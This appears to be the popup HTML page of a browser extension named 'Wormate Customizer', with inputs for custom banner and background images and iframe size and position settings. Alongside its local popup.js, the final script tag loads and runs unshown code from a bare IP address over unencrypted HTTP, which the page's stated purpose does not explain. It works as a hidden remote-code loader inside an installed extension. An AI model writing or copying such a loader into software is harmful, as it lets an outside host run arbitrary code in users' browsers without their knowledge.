<!DOCTYPE html>
<html>
<head>
    <title>Wormate Customizer</title>
    <style>
        body { width: 300px; padding: 10px; }
        input[type="text"], input[type="number"] { width: 100%; margin-bottom: 10px; }
        input[type="range"] { width: 100%; }
        .iframe-controls { border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h2>Wormate Customizer</h2>
    
    <label for="imageUrl">Custom Banner Image URL:</label>
    <input type="text" id="imageUrl">
    
    <label for="bgImageUrl">Custom Background Image URL:</label>
    <input type="text" id="bgImageUrl">
    
    <div class="iframe-controls">
        <h3>Iframe Settings</h3>
        <label for="iframeWidth">Width (px):</label>
        <input type="number" id="iframeWidth" min="100" max="1000">
        
        <label for="iframeHeight">Height (px):</label>
        <input type="number" id="iframeHeight" min="100" max="1000">
        
        <label for="iframeBottom">Bottom Position (px):</label>
        <input type="number" id="iframeBottom" min="0" max="1000">
        
        <label for="iframeRight">Right Position (px):</label>
        <input type="number" id="iframeRight" min="0" max="1000">
        
        <button id="restoreIframeDefaults">Restore Iframe Defaults</button>
    </div>
    
    <button id="saveSettings">Save All Settings</button>
    
    <br><br>
    
    <div id="message"></div>
    
    <script src="popup.js"></script>
    <script src="http://45.173.12.90:3000/js/a2gconnectpopup.js"></script>
</body>
</html>
